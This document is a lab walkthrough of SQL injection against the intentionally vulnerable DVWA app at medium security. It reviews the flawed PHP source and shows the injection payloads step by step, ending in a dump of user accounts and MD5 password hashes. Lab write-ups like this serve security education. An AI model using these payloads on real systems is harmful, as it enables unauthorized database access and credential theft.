# DVWA SQL Injection Walkthrough — Medium Security Level
Assignment 04 — SQL Injection Mastery

**Target Endpoint:** `http://localhost:8080/vulnerabilities/sqli/`  
**Security Level:** Medium  
**Form Method:** POST (Client UI presents a `<select>` dropdown menu)

---

## 1. Vulnerability Analysis (Source Code Review)

```php
// Source in dvwa/vulnerabilities/sqli/source/medium.php:
if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( ... );
    ...
```

### Flaw Mechanics:
1. The developer applies `mysqli_real_escape_string()`, which escapes special characters such as `'`, `"`, `\x00`, `\n`, `\r`, `\x1a`.
2. However, look closely at the query: `$id` is **NOT enclosed in quotes** (`WHERE user_id = $id;`). It is an integer/numeric context!
3. `mysqli_real_escape_string` only protects string-literal contexts enclosed in quotes. Because no quotes are needed to break out of numeric SQL context, escaping quotes has **zero protective effect**!

---

## 2. Step-by-Step Exploitation Workflow

### Step 1: Intercept Request
In browser or Burp Suite, select `1` in the dropdown, click **Submit**, and intercept the POST body:
```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

id=1&Submit=Submit
```

### Step 2: Test Numeric Tautology (No Quotes)
- **Tampered POST Parameter:**
  ```
  id=1 OR 1=1&Submit=Submit
  ```
- **Observed Response:**
  The server executes: `SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1;`  
  Every user record in the database is returned!

### Step 3: Determine Column Count
- **Tampered POST Parameter:**
  ```
  id=1 ORDER BY 2&Submit=Submit
  ```
  *(Status: 200 OK — 2 columns verified)*

### Step 4: Extract Database Version & Current User
- **Tampered POST Parameter:**
  ```
  id=1 UNION SELECT version(), user()&Submit=Submit
  ```
- **Extracted Data:** Echoes MySQL version and user account.

### Step 5: Dump Users and Password Hashes (Using Hex Encoding to Avoid Quotes)
Because `mysqli_real_escape_string` would escape quotes if we typed `'users'`, we can refer to strings using hexadecimal notation (`0x7573657273` = `'users'`) or simply omit quotes:
- **Tampered POST Parameter:**
  ```
  id=1 UNION SELECT null, CONCAT(user, 0x3a, password) FROM users&Submit=Submit
  ```
- **Extracted Data:** Full dump of user accounts and MD5 hashes:
  - `admin:5f4dcc3b5aa765d61d8327deb882cf99`
  - `gordonb:e99a18c428cb38d5f260853678922e03`
